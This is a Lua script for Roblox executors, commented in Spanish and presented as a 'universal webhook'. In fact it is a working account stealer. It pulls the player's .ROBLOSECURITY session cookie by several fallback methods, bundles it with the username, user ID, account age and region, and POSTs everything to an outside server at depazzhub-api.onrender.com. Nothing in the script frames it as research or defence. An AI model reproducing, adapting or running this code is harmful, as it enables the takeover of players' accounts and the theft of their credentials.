-- =====================================================================
-- SCRIPT UNIVERSAL DE WEBHOOK (Todo en uno, sin dependencias externas)
-- =====================================================================

local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")

local player = Players.LocalPlayer
local placeId = game.PlaceId

-- 1. FUNCIÓN UNIVERSAL DE COOKIES
local function GetUniversalCookie()
    -- Método A: Función nativa getcookie() (La más compatible)
    if type(getcookie) == "function" then
        local success, cookie = pcall(getcookie)
        if success and cookie and tostring(cookie) ~= "" then
            return ".ROBLOSECURITY=" .. tostring(cookie)
        end
    end

    -- Método B: Variables de entorno globales (getgenv)
    local envNames = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie", "auth_token"}
    for _, name in ipairs(envNames) do
        local env = getgenv()
        if env[name] and tostring(env[name]) ~= "" then
            return ".ROBLOSECURITY=" .. tostring(env[name])
        end
    end

    -- Método C: CookieService (Último recurso)
    local success, CookieService = pcall(function() 
        return game:GetService("CookieService") 
    end)
    
    if success and CookieService then
        local success2, savedCookie = pcall(function() 
            return CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com") 
        end)
        if success2 and savedCookie and tostring(savedCookie) ~= "" then
            return ".ROBLOSECURITY=" .. tostring(savedCookie)
        end
    end

    return "COOKIE_NO_DISPONIBLE"
end

-- 2. FUNCIONES AUXILIARES
local function GetAccountAge()
    return tostring(player.AccountAge) .. " días"
end

local function GetRegion()
    local success, region = pcall(function()
        return LocalizationService.RobloxLocaleId
    end)
    return success and tostring(region) or "Desconocida"
end

-- 3. RECOPILACIÓN DE DATOS
local data = {
    username = player.Name,
    displayName = player.DisplayName,
    userId = player.UserId,
    gameId = placeId,
    accountAge = GetAccountAge(),
    region = GetRegion(),
    cookie = GetUniversalCookie()
}

-- 4. FUNCIÓN UNIVERSAL PARA ENVIAR HTTP (EVITA EL ERROR DE BLOQUEO)
local function SendWebhook(url, data)
    local jsonData = game:GetService("HttpService"):JSONEncode(data)
    
    -- Intentar con request() (Funciona en 95% de executores modernos)
    if type(request) == "function" then
        local success, result = pcall(request, {
            Url = url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
        return success, result
    end
    
    -- Fallback a syn.request() (Para executores más antiguos)
    if type(syn) == "table" and type(syn.request) == "function" then
        local success, result = pcall(syn.request, {
            Url = url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
        return success, result
    end
    
    -- Último recurso: HttpService (Solo si no está bloqueado)
    local success, result = pcall(function()
        return game:GetService("HttpService"):PostAsync(url, jsonData)
    end)
    return success, result
end

-- 5. ENVÍO DEL WEBHOOK
local webhookUrl = "https://depazzhub-api.onrender.com/log"

local success, response = SendWebhook(webhookUrl, data)

if success then
    print("✅ Webhook enviado correctamente a DepazzHub!")
    -- Imprimir detalles si están disponibles
    if response then
        print("📊 Status:", response.StatusCode or response.status or "200")
    end
else
    warn("❌ Error al enviar el webhook:", response)
end
